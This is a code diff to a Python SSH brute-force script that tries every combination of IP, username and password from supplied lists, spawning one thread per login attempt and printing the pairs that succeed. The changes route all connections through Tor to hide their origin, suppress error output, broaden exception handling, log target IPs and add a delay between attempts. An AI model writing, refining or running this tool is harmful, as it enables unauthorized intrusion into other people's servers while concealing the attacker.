@@ -9,18 +9,29 @@ if len(sys.argv) < 4:
 
 filename_i=sys.argv[1] ; filename_u=sys.argv[2] ; filename_p=sys.argv[3]
 
+_s = sys.stderr
+sys.stderr = open('/dev/null', 'w')
+
 def attempt(ip,UserName,Password):
-    # for tor use
-    #socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-    #socket.socket = socks.socksocket
+    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+    socket.socket = socks.socksocket
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    #ssh.banner_timeout = 4
     try:
         ssh.connect(ip, username=UserName, password=Password,timeout=5)
     except paramiko.AuthenticationException:
-        print('[-] %s:%s fail!' % (UserName, Password))
+        print('[-] %s:%s:%s fail!' % (ip,UserName, Password))
     except socket.error:
-        print('[-] %s:%s fail!' % (UserName, Password))
+        print('[-] %s:%s:%s fail!' % (ip,UserName, Password))
+    except paramiko.SSHException:
+    	print('[-] %s:%s:%s fail!' % (ip,UserName, Password))
+    except paramiko.ssh_exception.SSHException:
+    	print('[-] %s:%s:%s fail!' % (ip,UserName, Password))
+    except SSHException:
+    	print('[-] %s:%s:%s fail!' % (ip,UserName, Password))
+    except EOFError:
+        print('[-] %s:%s:%s fail!' % (ip,UserName, Password))
     else:
         print('[!] %s:%s:%s is CORRECT!' % (ip, UserName, Password))
     ssh.close()
@@ -39,7 +50,7 @@ for ip, username, password in product(lst1, lst2, lst3):
     #print("{} {} {}".format(ip, username, password))
     t = threading.Thread(target=attempt, args=(ip,username,password))
     t.start()
-    #time.sleep(0.3)
+    time.sleep(0.3)
 
 fd.close()
 fdd.close()
